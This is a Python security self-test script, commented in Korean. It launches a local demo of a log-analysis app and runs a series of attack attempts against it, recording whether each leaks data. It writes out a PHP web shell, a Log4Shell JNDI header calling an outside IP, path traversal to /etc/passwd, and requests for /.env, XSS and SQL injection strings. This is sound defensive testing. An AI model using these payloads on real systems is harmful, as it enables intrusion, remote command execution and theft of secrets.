#!/usr/bin/env python3
"""안전한 데모 서버(LOGSIGHT_DEMO=1)를 로컬에서 띄우고, 공격을 시도해 결과를 기록한다.
대상은 이 저장소의 로컬 데모뿐이다. 외부 주소에는 아무것도 보내지 않는다."""
import os, subprocess, sys, time
from pathlib import Path
import httpx

ROOT = Path(__file__).resolve().parents[1]
BASE = "http://127.0.0.1:8090"
env = dict(os.environ, LOGSIGHT_DEMO="1")
proc = subprocess.Popen([sys.executable, "-m", "uvicorn", "app:app", "--host", "127.0.0.1", "--port", "8090"],
                        cwd=ROOT, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(3)
results = []

def attempt(name, fn, leak_check=None):
    try:
        r = fn()
        leaked = bool(leak_check and leak_check(r))
        results.append((name, r.status_code, "유출됨!" if leaked else "막힘/무해"))
    except Exception as exc:  # noqa: BLE001
        results.append((name, "-", f"연결 오류: {type(exc).__name__}"))

try:
    with httpx.Client(base_url=BASE, timeout=20) as c:
        shell = b"<?php system($_GET['c']); ?>"
        attempt("웹셸 업로드(/web/scan)", lambda: c.post("/web/scan", files=[("access", ("shell.php", shell, "text/plain"))]))
        attempt("웹셸 업로드(/api/web/scan)", lambda: c.post("/api/web/scan", files=[("access", ("shell.php", shell, "text/plain"))]))
        attempt("업로드(/analyze, AWS 경로)", lambda: c.post("/analyze", files=[("cloudtrail", ("x.json", b"{}", "application/json"))]))
        attempt("큰 파일 업로드 20MB", lambda: c.post("/api/web/scan", files=[("access", ("big.log", b"a" * 20_000_000, "text/plain"))]))
        attempt("잘못된 multipart(경계 없음)", lambda: c.post("/web/scan", content=b"garbage", headers={"Content-Type": "multipart/form-data"}))
        attempt("HTTP PUT으로 업로드 시도", lambda: c.put("/web/scan", content=shell))
        attempt("HTTP DELETE 시도", lambda: c.delete("/web/demo"))
        attempt("경로 조작 /web/../../etc/passwd", lambda: c.get("/web/../../etc/passwd"),
                leak_check=lambda r: "root:" in r.text)
        attempt("샘플 외 파일 열람 /app.py", lambda: c.get("/app.py"), leak_check=lambda r: "FastAPI" in r.text)
        attempt("환경 파일 /.env", lambda: c.get("/.env"), leak_check=lambda r: "=" in r.text and r.status_code == 200)
        attempt("반사형 XSS 시도 /web/demo?x=<script>", lambda: c.get("/web/demo", params={"x": "<script>alert(1)</script>"}),
                leak_check=lambda r: "<script>alert(1)" in r.text)
        attempt("SQL 인젝션 문자열 /web/demo?q=' OR 1=1", lambda: c.get("/web/demo", params={"q": "' OR 1=1 --"}),
                leak_check=lambda r: r.status_code == 500)
        attempt("Log4Shell 헤더", lambda: c.get("/web/demo", headers={"User-Agent": "${jndi:ldap://198.51.100.99/a}"}))
        attempt("API 문서 노출 /openapi.json", lambda: c.get("/openapi.json"),
                leak_check=lambda r: r.status_code == 200)
        attempt("잘못된 JSON 본문 /api/web/scan", lambda: c.post("/api/web/scan", content=b"{{{", headers={"Content-Type": "application/json"}))
        attempt("요청 대량 반복 (100회 연속)", lambda: [c.get("/web/demo") for _ in range(100)][-1])
finally:
    proc.terminate()
    proc.wait(timeout=10)

print(f"{'공격':36s} {'응답':>6s}  결과")
for n, code, res in results:
    print(f"{n:36s} {str(code):>6s}  {res}")
leaks = [r for r in results if r[2] == "유출됨!"]
print(f"\n성공(유출/실행) {len(leaks)}건 / 시도 {len(results)}건")
